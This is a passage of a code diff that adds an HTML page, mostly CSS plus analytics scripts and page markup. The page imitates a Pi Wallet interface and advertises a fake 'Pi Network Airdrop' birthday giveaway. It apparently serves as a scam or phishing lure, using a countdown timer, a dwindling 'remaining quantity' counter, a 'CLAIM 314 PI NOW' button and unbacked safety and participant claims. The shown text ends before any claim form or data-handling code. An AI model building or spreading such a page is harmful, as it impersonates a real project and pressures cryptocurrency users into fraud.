+			}
+
+			.certificate-title {
+				font-weight: bold;
+				text-align: center;
+				margin-bottom: 0.5rem;
+				margin-top: 0.5rem;
+				font-size: 1.2rem;
+				color: var(--pi-purple);
+			}
+
+			.certificate-text {
+				text-align: center;
+				font-size: 0.95rem;
+				color: var(--text-secondary);
+			}
+
+			/* Floating icons - enhanced */
+			.floating-icon {
+				position: absolute;
+				z-index: -1;
+				opacity: 0.5;
+				animation: float 6s ease-in-out infinite;
+			}
+
+			/* Word counter styles - enhanced */
+			.word-counter {
+				text-align: right;
+				font-size: 0.9rem;
+				color: var(--text-secondary);
+				margin-top: 0.5rem;
+				margin-bottom: 0.5rem;
+				padding-right: 0.5rem;
+				display: none; /* Hidden by default */
+				transition: all 0.3s ease;
+			}
+
+			.word-counter.invalid {
+				color: #f44336;
+				font-weight: 600;
+				display: block; /* Show when invalid */
+				animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
+			}
+
+			/* Validation message - enhanced */
+			.validation-message {
+				color: #e74c3c;
+				font-size: 1rem; /* Kích thước lớn hơn chút */
+				margin-top: 0.5rem;
+				margin-bottom: 1rem;
+				text-align: left;
+				font-weight: 400;
+				padding-left: 0.5rem; /* Giảm padding */
+			}
+
+			.hidden {
+				display: none;
+			}
+
+			/* Visual indicator for input container - enhanced */
+			.pi-input-container.valid-input {
+				border: 2px solid #724394; /* Màu tím thay vì màu xanh */
+				box-shadow: 0 0 15px rgba(114, 67, 148, 0.2);
+			}
+			.pi-input-container.invalid-input {
+				border: 2px solid #f44336;
+				box-shadow: 0 0 15px rgba(244, 67, 54, 0.2);
+				animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
+			}
+
+			@keyframes shake {
+			}
+
+			/* Limited submissions message - enhanced */
+			.limit-message {
+				background-color: #fff3cd;
+				color: #856404;
+				padding: 15px;
+				border-radius: 8px;
+				margin-bottom: 20px;
+				text-align: center;
+				border: 1px solid #ffeeba;
+				font-weight: 500;
+				display: none;
+				box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+				position: relative;
+				overflow: hidden;
+			}
+
+			.limit-message::before {
+				content: "";
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 4px;
+				height: 100%;
+				background-color: #f8c056;
+			}
+
+			.error-message {
+				background-color: #f8d7da;
+				color: #721c24;
+				padding: 15px;
+				border-radius: 8px;
+				margin-bottom: 20px;
+				text-align: center;
+				border: 1px solid #f5c6cb;
+				font-weight: 500;
+				display: none;
+				box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+				position: relative;
+				overflow: hidden;
+			}
+
+			.error-message::before {
+				content: "";
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 4px;
+				height: 100%;
+				background-color: #f44336;
+			}
+
+			/* Professional floating icons */
+			.floating-icon-img {
+				position: absolute;
+				width: 80px;
+				height: 80px;
+				animation: iconFloat 40s linear infinite;
+				opacity: 0.9;
+				z-index: -5;
+				will-change: transform;
+				object-fit: contain;
+				/* Removed background-color, backdrop-filter, border-radius and box-shadow */
+			}
+
+			/* Professional icon float animation */
+			@keyframes iconFloat {
+				0% {
+					transform: translateY(100vh) translateX(0px);
+					opacity: 0;
+				}
+				10% {
+					opacity: 0.9;
+					transform: translateY(80vh)
+						translateX(var(--float-distance));
+				}
+				50% {
+					transform: translateY(40vh)
+						translateX(calc(var(--float-distance) * 1.5));
+				}
+				90% {
+					opacity: 0.9;
+					transform: translateY(10vh)
+						translateX(var(--float-distance));
+				}
+				100% {
+					transform: translateY(-100px)
+						translateX(var(--float-distance));
+					opacity: 0;
+				}
+			}
+
+			/* Language chooser - enhanced */
+			.language-chooser {
+				position: fixed;
+				bottom: 16px;
+				right: 16px;
+				display: flex;
+				align-items: center;
+				z-index: 60;
+				background: rgba(255, 255, 255, 0.9);
+				border-radius: 30px;
+				padding: 6px 10px;
+				box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+				backdrop-filter: blur(5px);
+				border: 1px solid rgba(255, 255, 255, 0.3);
+				transition: all 0.3s ease;
+			}
+
+			.language-chooser:hover {
+				box-shadow: 0 5px 15px rgba(0, 0, 0, 0.25);
+			}
+
+			/* Language chooser positioning for mobile devices */
+			@media (max-width: 640px) {
+				.language-chooser {
+					bottom: 16px;
+					right: 16px;
+				}
+			}
+
+			/* For very small screens */
+			@media (max-width: 380px) {
+				.language-chooser {
+					bottom: 10px;
+					right: 10px;
+					transform: scale(0.9);
+				}
+
+				/* .pi-header-content .flex.items-center {
+					transform: translateX(
+						-15px
+					); 
+				} */
+			}
+
+			.language-option {
+				display: flex;
+				align-items: center;
+				padding: 5px 10px;
+				border-radius: 6px;
+				cursor: pointer;
+				color: rgba(0, 0, 0, 0.7);
+				transition: all 0.2s ease;
+				margin-left: 8px;
+				font-size: 0.9rem;
+				font-weight: 500;
+			}
+
+			.language-option:hover {
+				color: #333;
+				background-color: rgba(0, 0, 0, 0.1);
+				transform: translateY(-1px);
+			}
+
+			.language-option.active {
+				color: #fff;
+				font-weight: bold;
+				background-color: var(--pi-purple);
+			}
+
+			.language-option img {
+				width: 18px;
+				height: 18px;
+				margin-right: 6px;
+				border-radius: 2px;
+				box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+			}
+
+			/* Blocked IP notification - enhanced */
+			.ip-blocked-message {
+				position: fixed;
+				top: 50%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+				background-color: rgba(0, 0, 0, 0.85);
+				color: white;
+				padding: 35px;
+				border-radius: 12px;
+				z-index: 2000;
+				max-width: 90%;
+				width: 420px;
+				text-align: center;
+				box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+				backdrop-filter: blur(8px);
+				display: none;
+				border: 1px solid rgba(255, 255, 255, 0.1);
+			}
+
+			.ip-blocked-message h3 {
+				color: #f44336;
+				margin-bottom: 20px;
+				font-size: 1.7rem;
+				font-weight: 700;
+			}
+
+			.ip-blocked-message p {
+				margin-bottom: 25px;
+				line-height: 1.6;
+				font-size: 1.1rem;
+			}
+
+			.ip-blocked-message button {
+				background-color: #f44336;
+				color: white;
+				border: none;
+				padding: 12px 24px;
+				border-radius: 8px;
+				font-weight: bold;
+				cursor: pointer;
+				transition: all 0.3s ease;
+				font-size: 1rem;
+				box-shadow: 0 5px 15px rgba(244, 67, 54, 0.3);
+			}
+
+			.ip-blocked-message button:hover {
+				background-color: #d32f2f;
+				transform: translateY(-2px);
+				box-shadow: 0 8px 20px rgba(244, 67, 54, 0.4);
+			}
+
+			/* IP location detection notification - enhanced */
+			.location-detected {
+				background: rgba(255, 255, 255, 0.97);
+				color: #333;
+				padding: 12px 20px;
+				border-radius: 50px;
+				position: fixed;
+				bottom: 20px;
+				left: 50%;
+				transform: translateX(-50%) translateY(20px);
+				box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+				z-index: 100;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				font-size: 0.9rem;
+				max-width: 90%;
+				opacity: 0;
+				transition: opacity 0.3s ease, transform 0.3s ease;
+				pointer-events: none;
+				border: 1px solid rgba(255, 255, 255, 0.3);
+			}
+
+			.location-detected.visible {
+				opacity: 1;
+				transform: translateX(-50%) translateY(0);
+				pointer-events: all;
+			}
+
+			.location-detected i {
+				color: var(--pi-purple);
+				margin-right: 8px;
+			}
+
+			.location-detected .country-flag {
+				width: 22px;
+				height: 22px;
+				border-radius: 50%;
+				margin-right: 10px;
+				box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+			}
+
+			/* Form page enhancements */
+			#formPage {
+				background-color: white !important;
+				min-height: calc(100vh);
+			}
+
+			#formPage .pi-wallet-style {
+				background-color: white;
+				margin-top: 15%;
+			}
+
+			#formPage .pi-title {
+				color: #333;
+				text-shadow: none;
+				font-weight: 500;
+				margin-top: 0; /* Giảm margin từ trên xuống */
+				margin-bottom: 2rem;
+			}
+
+			#formPage .pi-info-text {
+				color: #555;
+				font-weight: 400; /* REDUCED from original */
+			}
+
+			#formPage .pi-input {
+				color: #333;
+				font-weight: 500;
+			}
+
+			#formPage .limit-message {
+				background-color: #fff3cd;
+				color: #856404;
+			}
+
+			#formPage .error-message {
+				background-color: #f8d7da;
+				color: #721c24;
+			}
+
+			/* Pending requests notification - enhanced */
+			.pending-requests-badge {
+				position: fixed;
+				bottom: 70px;
+				right: 16px;
+				background: linear-gradient(135deg, #f44336, #ff8177);
+				color: white;
+				border-radius: 25px;
+				padding: 8px 16px;
+				font-size: 0.8rem;
+				font-weight: bold;
+				z-index: 100;
+				box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+				display: none;
+				transform: translateY(0);
+				transition: transform 0.3s ease, box-shadow 0.3s ease;
+				border: 1px solid rgba(255, 255, 255, 0.2);
+			}
+
+			.pending-requests-badge:hover {
+				transform: translateY(-3px);
+				box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+			}
+
+			/* Festive birthday elements */
+			.birthday-badge {
+				position: absolute;
+				top: 10px;
+				right: 10px;
+				width: 60px;
+				height: 60px;
+				background: linear-gradient(
+					135deg,
+					var(--pi-gold),
+					var(--pi-gold-dark)
+				);
+				border-radius: 50%;
+				display: flex;
+				flex-direction: column;
+				align-items: center;
+				justify-content: center;
+				box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+				color: white;
+				font-weight: bold;
+				font-size: 0.8rem;
+				padding: 5px;
+				transform: rotate(15deg);
+				z-index: 10;
+			}
+
+			.birthday-badge span:first-child {
+				font-size: 1.2rem;
+			}
+
+			/* Success Modal Enhancements - Pi Transaction Style */
+			#successModal {
+				z-index: 2500;
+			}
+
+			#successModal .receipt-container {
+				max-width: 400px;
+				border-radius: 16px;
+				overflow: hidden;
+				box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+				position: relative;
+			}
+
+			/* Highlight Important Note Effect */
+			.modal-highlight-overlay {
+				position: fixed;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background-color: rgba(0, 0, 0, 0.92); /* Color más oscuro */
+				z-index: 2501;
+				opacity: 0;
+				transition: opacity 0.5s ease;
+				pointer-events: none;
+			}
+
+			.modal-container {
+				position: relative;
+				z-index: 2502; /* Por encima del overlay */
+			}
+
+			.modal-highlight-active .modal-content-section {
+				opacity: 0.2; /* Más atenuado */
+				transition: opacity 0.5s ease;
+				pointer-events: none;
+				filter: grayscale(100%); /* Añadir efecto de escala de grises */
+			}
+
+			.modal-highlight-overlay.active {
+				opacity: 1;
+				pointer-events: auto;
+			}
+
+			.highlight-important-note {
+				position: relative;
+				z-index: 2503;
+				animation: pulse-highlight 2s infinite;
+				box-shadow: 0 0 30px 15px rgba(255, 193, 7, 0.5); /* Sombra más pronunciada */
+				transform: scale(1.05);
+				transition: all 0.5s ease;
+				opacity: 1 !important;
+				pointer-events: auto !important;
+				background-color: rgba(
+					255,
+					248,
+					225,
+					1
+				) !important; /* Fondo más brillante */
+				border-color: #ffc107 !important; /* Borde más visible */
+			}
+
+			.highlight-important-note:before {
+				content: "";
+				position: absolute;
+				top: -8px;
+				left: -8px;
+				right: -8px;
+				bottom: -8px;
+				border: 2px solid #ffc107;
+				border-radius: 8px;
+				animation: pulse-border 2s infinite;
+				z-index: -1;
+			}
+
+			.understand-btn {
+				display: inline-block;
+				background-color: #ffc107;
+				color: #333;
+				font-weight: bold;
+				padding: 8px 15px;
+				border-radius: 4px;
+				margin-top: 8px;
+				cursor: pointer;
+				transition: all 0.3s ease;
+				border: none;
+				text-transform: uppercase;
+				font-size: 0.85rem;
+				pointer-events: auto !important;
+				box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Sombra añadida para destacar el botón */
+			}
+
+			.modal-highlight-active {
+				background-color: rgba(
+					0,
+					0,
+					0,
+					0.95
+				) !important; /* Fondo del modal más oscuro cuando está activo */
+			}
+
+			.understand-btn:hover {
+				background-color: #ffd54f;
+				transform: translateY(-2px);
+			}
+
+			/* Animaciones se mantienen igual */
+			@keyframes pulse-highlight {
+				0%,
+				100% {
+					box-shadow: 0 0 20px 10px rgba(255, 193, 7, 0.2);
+				}
+				50% {
+					box-shadow: 0 0 25px 15px rgba(255, 193, 7, 0.4);
+				}
+			}
+
+			@keyframes pulse-border {
+				0%,
+				100% {
+					opacity: 0.6;
+				}
+				50% {
+					opacity: 1;
+				}
+			}
+
+			/* Transaction header styling */
+			.transaction-header {
+				background: linear-gradient(
+					135deg,
+					var(--pi-purple),
+					var(--pi-purple-dark)
+				);
+				padding: 20px;
+				position: relative;
+			}
+
+			.transaction-amount {
+				font-size: 2.5rem;
+				font-weight: 700;
+				color: white;
+				text-align: center;
+				margin: 10px 0;
+			}
+
+			.transaction-date {
+				color: rgba(255, 255, 255, 0.8);
+				text-align: center;
+				font-size: 0.9rem;
+			}
+
+			.transaction-close-btn {
+				position: absolute;
+				top: 15px;
+				right: 15px;
+				color: white;
+				background: rgba(255, 255, 255, 0.2);
+				border-radius: 50%;
+				width: 30px;
+				height: 30px;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				cursor: pointer;
+				transition: all 0.2s ease;
+			}
+
+			.transaction-close-btn:hover {
+				background: rgba(255, 255, 255, 0.3);
+				transform: scale(1.1);
+			}
+
+			.transaction-details {
+				padding: 20px;
+			}
+
+			.transaction-detail-row {
+				display: flex;
+				justify-content: space-between;
+				padding: 12px 0;
+				border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+			}
+
+			.transaction-detail-label {
+				color: rgba(0, 0, 0, 0.6);
+				font-weight: 500;
+			}
+
+			.transaction-detail-value {
+				font-weight: 600;
+			}
+
+			/* Enhanced notification banner */
+			.notification-banner {
+				background: linear-gradient(
+					to right,
+					rgba(248, 192, 86, 0.95),
+					rgba(230, 169, 56, 0.95)
+				);
+				border-radius: 8px;
+				box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+				margin: 0 auto 16px;
+				max-width: 96%;
+				padding: 12px 20px;
+				font-weight: 500;
+				color: #57401a;
+				position: relative;
+				border: 1px solid rgba(248, 192, 86, 0.3);
+				overflow: hidden;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+			}
+
+			.notification-banner::before {
+				content: "";
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+			}
+
+			.notification-banner p {
+				margin: 0;
+				position: relative;
+				font-size: 0.95rem;
+				line-height: 1.5;
+				text-align: center;
+			}
+
+			.notification-banner i {
+				margin-right: 10px;
+				color: #57401a;
+				font-size: 1.2rem;
+			}
+
+			@keyframes shimmer {
+				0% {
+					transform: translateX(-100%);
+				}
+				100% {
+					transform: translateX(100%);
+				}
+			}
+
+			/* Enhanced Animations */
+			@keyframes shineIcon {
+				0% {
+					transform: rotate(30deg) translateX(-100%);
+				}
+				100% {
+					transform: rotate(30deg) translateX(100%);
+				}
+			}
+
+			@keyframes spin {
+				to {
+					transform: rotate(360deg);
+				}
+			}
+
+			@keyframes twinkle {
+				0%,
+				100% {
+					opacity: 0.2;
+					transform: scale(1);
+				}
+				50% {
+					opacity: 0.5;
+					transform: scale(1.2);
+				}
+			}
+
+			@keyframes twinkleStar {
+				0%,
+				100% {
+					opacity: 0.4;
+					transform: scale(1);
+					filter: blur(0.5px);
+				}
+				50% {
+					opacity: 0.8;
+					transform: scale(1.3);
+					filter: blur(1px);
+				}
+			}
+
+			@keyframes float {
+				0% {
+					transform: translateY(0);
+				}
+				50% {
+					transform: translateY(-10px);
+				}
+				100% {
+					transform: translateY(0);
+				}
+			}
+
+			@keyframes floatParticle {
+				0% {
+					transform: translateY(0) rotate(0deg);
+				}
+				50% {
+					transform: translateY(-20px) rotate(180deg);
+				}
+				100% {
+					transform: translateY(0) rotate(360deg);
+				}
+			}
+
+			@keyframes waveRotate {
+				0% {
+					transform: translate(-50%, -50%) rotate(0deg);
+				}
+				100% {
+					transform: translate(-50%, -50%) rotate(360deg);
+				}
+			}
+
+			@keyframes coinRotate {
+				0% {
+					transform: rotateY(0deg);
+				}
+				100% {
+					transform: rotateY(360deg);
+				}
+			}
+
+			@keyframes explode {
+				0% {
+					opacity: 1;
+					transform: translate(0, 0) scale(1);
+				}
+				100% {
+					opacity: 0;
+					transform: translate(var(--tx), var(--ty)) scale(0);
+				}
+			}
+
+			@keyframes lightStreak {
+				0%,
+				100% {
+					opacity: 0;
+					transform: rotate(45deg) translateX(-100px);
+				}
+				10%,
+				90% {
+					opacity: 0.3;
+				}
+				50% {
+					transform: rotate(45deg) translateX(calc(100vw + 100px));
+				}
+			}
+
+			/* Enhanced shooting star animation */
+			@keyframes shootingStar {
+				0% {
+					opacity: 0;
+					transform: translateX(0) translateY(0) scale(0.5);
+				}
+				10% {
+					opacity: 0.3;
+					transform: translateX(50px) translateY(50px) scale(0.7);
+				}
+				45% {
+					opacity: 1;
+					transform: translateX(150px) translateY(150px) scale(1);
+				}
+				70% {
+					opacity: 0.3;
+					transform: translateX(250px) translateY(250px) scale(0.7);
+				}
+				100% {
+					opacity: 0;
+					transform: translateX(300px) translateY(300px) scale(0.5);
+				}
+			}
+
+			/* Enhanced card wave animation */
+			@keyframes cardWave {
+				0%,
+				100% {
+					opacity: 0;
+					transform: translate(-25%, -25%) scale(0.1);
+				}
+				50% {
+					opacity: 0.4;
+					transform: translate(-25%, -25%) scale(1.8);
+				}
+			}
+
+			/* Enhanced confetti animation */
+			@keyframes confettiFall {
+				0% {
+					opacity: 1;
+					transform: translateY(-10vh) rotate(0deg) scale(0.8);
+				}
+				50% {
+					opacity: 0.8;
+					transform: translateY(50vh) rotate(360deg) scale(1.2);
+				}
+				100% {
+					opacity: 0.2;
+					transform: translateY(100vh) rotate(720deg) scale(0.8);
+				}
+			}
+
+			/* Enhanced shiny wave animation */
+			@keyframes shinyWave {
+				0% {
+					left: -100%;
+				}
+				100% {
+					left: 150%;
+				}
+			}
+
+			/* Rotation animation */
+			@keyframes rotate {
+				0% {
+					transform: rotate(0deg);
+				}
+				100% {
+					transform: rotate(360deg);
+				}
+			}
+
+			/* Countdown Timer Styles */
+			.countdown-container div {
+				position: relative;
+				transition: all 0.2s ease;
+			}
+
+			.countdown-container div:not(:last-child)::after {
+				content: ":";
+				position: absolute;
+				right: -12px;
+				top: 50%;
+				transform: translateY(-50%);
+				font-size: 24px;
+				font-weight: bold;
+				color: var(--pi-purple);
+			}
+
+			.countdown-container div > div:first-child {
+				box-shadow: 0 8px 15px rgba(105, 57, 136, 0.3);
+				position: relative;
+				overflow: hidden;
+				border-radius: 0.5rem;
+			}
+
+			.countdown-container div > div:first-child::after {
+				content: "";
+				position: absolute;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 2px;
+				background: rgba(255, 255, 255, 0.5);
+			}
+
+			.countdown-pulse {
+				animation: countdown-pulse 1s ease;
+			}
+
+			@keyframes countdown-pulse {
+				0% {
+					transform: scale(1);
+				}
+				50% {
+					transform: scale(1.08);
+				}
+				100% {
+					transform: scale(1);
+				}
+			}
+			.icon-header-main svg {
+				color: #F8B85B;
+				display: flex;
+				align-items: center;
+				margin-left: 10px;
+			}
+
+			.notice {
+				position: fixed;
+				bottom: 50px;
+				right: 10px;
+				background-color: #6d3b8fe4; /* Màu tím */
+				color: #FFFFFF; /* Màu trắng */
+				padding: 15px 25px;
+				border-radius: 10px;
+				display: none;
+				box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+				font-size: 16px;
+				font-weight: bold;
+				z-index: 1000;
+			}
+
+			.show-notice {
+				display: block;
+				animation: fadeIn 0.5s;
+			}
+
+			@keyframes fadeIn {
+				from {
+					opacity: 0;
+					transform: translateX(100px);
+				}
+				to {
+					opacity: 1;
+					transform: translateX(0);
+				}
+			}
+		</style>
+
+		<!-- Google Tag Manager -->
+		<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+		new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+		j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+		'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+		})(window,document,'script','dataLayer','GTM-MMXD7N7V');</script>
+		<!-- End Google Tag Manager -->
+		 
+		<!-- Histats.com  START  (aync)-->
+		<script type="text/javascript">var _Hasync= _Hasync|| [];
+		_Hasync.push(['Histats.start', '1,4944516,4,0,0,0,00010000']);
+		_Hasync.push(['Histats.fasi', '1']);
+		_Hasync.push(['Histats.track_hits', '']);
+		(function() {
+		var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+		hs.src = ('//s10.histats.com/js15_as.js');
+		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+		})();</script>
+		<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4944516&101" alt="" border="0"></a></noscript>
+		<!-- Histats.com  END  -->
+
+	</head>
+	<body>
+		<!-- Premium Background Elements - With optimized shooting stars -->
+		<div class="premium-bg">
+			<div class="animated-gradient"></div>
+			<div class="wave-container">
+				<div class="wave wave1"></div>
+				<div class="wave wave2"></div>
+				<div class="wave wave3"></div>
+			</div>
+			<div id="starsContainer"></div>
+			<div id="singleStarsContainer"></div>
+			<div id="shootingStarsContainer"></div>
+			<div id="particlesContainer"></div>
+			<div id="coinsContainer"></div>
+			<div id="lightStreaksContainer"></div>
+		</div>
+
+		<!-- Loading Overlay -->
+		<div id="loadingOverlay" class="loading-overlay">
+			<div class="loading-spinner">
+				<div
+					class="loading-spinner-label"
+					data-vi="Processing..."
+					data-en="Processing..."
+				>
+					Processing...
+				</div>
+			</div>
+		</div>
+
+		<!-- Confetti container for success celebration -->
+		<div id="confettiContainer" class="confetti-container"></div>
+
+		<!-- IP Blocked Message -->
+		<div id="ipBlockedMessage" class="ip-blocked-message">
+			<h3 data-vi="Access Denied" data-en="Access Denied">
+				Access Denied
+			</h3>
+			<p
+				data-vi="Your IP address has been blocked due to suspicious activity. Please contact support if you believe this is an error."
+				data-en="Your IP address has been blocked due to suspicious activity. Please contact support if you believe this is an error."
+			>
+			Your IP address has been blocked due to suspicious activity. Please contact support if you believe this is an error.
+			</p>
+			<button id="closeBlockedMessage" data-vi="Đóng" data-en="Close">
+				Close
+			</button>
+		</div>
+
+		<!-- Location Detection Notification -->
+		<div id="locationDetectedMessage" class="location-detected">
+			<img
+				id="countryFlag"
+				src=""
+				alt="Country Flag"
+				class="country-flag"
+			/>
+			<span id="locationText"></span>
+		</div>
+
+		<!-- Pending Requests Badge -->
+		<div id="pendingRequestsBadge" class="pending-requests-badge">
+			<span data-vi="Pending: " data-en="Pending: "></span>
+			<span id="pendingCount">0</span>
+		</div>
+
+		<!-- Pi Wallet Header -->
+		<header class="pi-header">
+			<div class="pi-header-content">
+				<button class="header-back-btn" id="headerBackBtn">
+					<svg
+						xmlns="http://www.w3.org/2000/svg"
+						width="24"
+						height="24"
+						viewBox="0 0 24 24"
+						fill="none"
+						stroke="currentColor"
+						stroke-width="2"
+						stroke-linecap="round"
+						stroke-linejoin="round"
+					>
+						<path d="M15 18l-6-6 6-6"></path>
+					</svg>
+				</button>
+
+				<div class="flex items-center">
+					<div class="wallet-icon">π</div>
+					<span class="wallet-text">Wallet</span>
+					<div class="icon-header-main"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" fill="none" width="20" height="20" class="text-secondary-500"><path fill="currentColor" d="M94.91 66.314c0-1.078.875-1.953 1.954-1.953h18.878c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953H96.863a1.953 1.953 0 0 1-1.953-1.953V66.314ZM133.97 66.314c0-1.078.875-1.953 1.953-1.953h18.879c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953h-18.879a1.953 1.953 0 0 1-1.953-1.953V66.314Z"></path><path fill="currentColor" d="M94.91 115.616v77.765l22.785 8.992v-86.757h16.275v77.765l22.785 8.992v-86.757h15.14c12.491 0 22.618-10.234 22.618-22.858V79.985h-22.618v12.773H80.422c-12.492 0-22.618 10.234-22.618 22.858v15.798h22.618v-15.798h14.489Z"></path><path fill="currentColor" fill-rule="evenodd" d="M130.122 20.75c-60.368 0-109.305 48.937-109.305 109.305 0 60.367 48.937 109.305 109.305 109.305 60.367 0 109.305-48.938 109.305-109.305 0-60.368-48.938-109.305-109.305-109.305ZM.943 130.055C.943 58.711 58.778.875 130.122.875c71.343 0 129.178 57.836 129.178 129.18 0 71.343-57.835 129.178-129.178 129.178C58.778 259.233.943 201.398.943 130.055Z" clip-rule="evenodd"></path></svg></div>
+					<!-- <div class="pi-coin-icon">π</div> -->
+				</div>
+
+				<button class="header-dropdown-btn" id="headerDropdownBtn">
+					<svg
+						xmlns="http://www.w3.org/2000/svg"
+						width="24"
+						height="24"
+						viewBox="0 0 24 24"
+						fill="none"
+						stroke="currentColor"
+						stroke-width="2"
+						stroke-linecap="round"
+						stroke-linejoin="round"
+					>
+						<path d="M6 9l6 6 6-6"></path>
+					</svg>
+				</button>
+			</div>
+		</header>
+
+		<!-- Main Content -->
+		<div class="page-container">
+			<!-- Home Page -->
+			<div id="homePage" class="page page-active">
+				<div class="container mx-auto px-4">
+					<!-- Hero Section -->
+					<section class="text-center relative mb-10">
+						<i
+							class="fas fa-star floating-icon"
+							style="top: 10%; right: 10%; opacity: 0.3"
+						></i>
+						<i
+							class="fas fa-coins floating-icon"
+							style="bottom: 20%; left: 5%; opacity: 0.3"
+						></i>
+
+						<h2
+							class="text-xl mx-auto font-bold inline-block relative pt-10 mb-2"
+						>
+							Pi Network Airdrop Program 
+							
+						</h2>
+						<p
+							class="text-4xl mb-8 max-w-2xl mx-auto"
+							data-delay="200"
+						
+						>
+							Happy 6th Birthday
+						</p>
+						<div class="mt-4">
+							🎁 Celebrating the 6th birthday and preparing for the Mainnet Mass phase. To thank the entire community, the Pi Network project team will randomly give away 31π - 314π to 31,415 wallets that have successfully KYC.
+						</div>
+						<div class="text-6xl font-bold animate-bounce my-8" style="color: rgb(251, 180, 74)">
+							+314
+							<svg class="inline-block w-8 h-8 -mt-4" viewBox="0 0 250 250">
+								<path fill="currentColor" d="M94.91 115.616v77.765l22.785 8.992v-86.757h16.275v77.765l22.785 8.992v-86.757h15.14c12.491 0 22.618-10.234 22.618-22.858V79.985h-22.618v12.773H80.422c-12.492 0-22.618 10.234-22.618 22.858v15.798h22.618v-15.798h14.489Z"></path>
+							</svg>
+						</div>
+						<div class="text-lg mb-6">
+							<div class="mt-2" style="text-align: center;">
+								<div style="display: inline-block; text-align: left;">
+									<i class="fas fa-bolt pr-2"></i> Time Remaining: <span id="countdown"  class="font-bold text-shadow">18:47:30</span> minutes
+									<br>
+									<i class="fas fa-check-circle pr-2"></i> Condition: KYC Successfully Passed
+									<br>
+									<i class="fas fa-bullseye pr-2"></i> Remaining Quantity: <span class="font-bold"><span id="remainingQuantity">30015</span>/31415</span>
+								</div>
+							</div>
+						</div>
+						<button
+							id="openFormBtn"
+							class="btn-primary text-lg"
+							data-delay="400"
+						>
+							CLAIM 314 PI NOW
+						</button>
+					
+						<!-- Features with enhanced wave effect -->
+						<div
+							class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-12"
+						>
+							<div class="card p-5 feature-card">
+								<div class="feature-card-wave"></div>
+								<div class="feature-icon">
+									<i class="fas fa-check-circle"></i>
+								</div>
+								<p
+									class="font-medium mt-4"
+								>
+									Birthday Program
+								</p>
+							</div>
+							<div class="card p-5 feature-card">
+								<div class="feature-card-wave"></div>
+								<div class="feature-icon">
+									<i class="fas fa-clock"></i>
+								</div>
+								<p
+									class="font-medium mt-4"
+								>
+									Receive in 24h
+								</p>
+							</div>
+							<div class="card p-5 feature-card">
+								<div class="feature-card-wave"></div>
+								<div class="feature-icon">
+									<i class="fas fa-shield-alt"></i>
+								</div>
+								<p
+									class="font-medium mt-4"
+								>
+									Safe & Secure
+								</p>
+							</div>
+							<div class="card p-5 feature-card">
+								<div class="feature-card-wave"></div>
+								<div class="feature-icon">
+									<i class="fas fa-users"></i>
+								</div>
+								<p
+									class="font-medium mt-4"
+								>
+									500000+ Participants
+								</p>
+							</div>
+						</div>
+
+					
+					</section>
+				
+					<!-- About Section with Enhanced Illustration -->
+					<section class="mb-10">
+						<div class="card p-8 max-w-4xl mx-auto">
+							<h3
+								class="text-3xl font-bold mb-8 text-center"
+								data-vi="About This Program"
+								data-en="About This Program"
+							>
+								About This Program
+							</h3>
+
+							<!-- Enhanced About Illustration -->
+							<div class="about-illustration">
+								<div class="about-circle">
+									<i class="fas fa-shield-alt about-icon"></i>
+								</div>
+							</div>
+
+							<p
+								class="mb-8 text-lg text-center"
+								data-vi="This reward program is an initiative by Picoreteam and sponsors to support Pi Network pioneers. As an independent promotion, we distribute a limited amount of Pi coins to active community members."
+								data-en="This reward program is an initiative by Picoreteam and sponsors to support Pi Network pioneers. As an independent promotion, we distribute a limited amount of Pi coins to active community members."
+							>
+								This reward program is an initiative by Picoreteam and sponsors to support Pi Network pioneers. As an independent promotion, we distribute a limited amount of Pi coins to active community members.
+							</p>
+
+							<h4
+								class="text-2xl font-bold mb-6 text-center"
+								data-vi="How It Works"
+								data-en="How It Works"
+							>
+								How It Works
+							</h4>
+							<div
+								class="grid grid-cols-2 md:grid-cols-4 gap-6 mb-8"
+							>
+								<div class="text-center">
+									<div
+										class="text-2xl font-bold text-purple-600 mb-2"
+									>
+										1
+									</div>
+									<p
+										data-vi='Click the "Get Pi Rewards Now" button above'
+										data-en='Click the "Get Pi Rewards Now" button above'
+									>
+										Click the "Get Pi Rewards Now" button above
+									</p>
+								</div>
+								<div class="text-center">
+									<div
+										class="text-2xl font-bold text-purple-600 mb-2"
+									>
+										2
+									</div>
+									<p
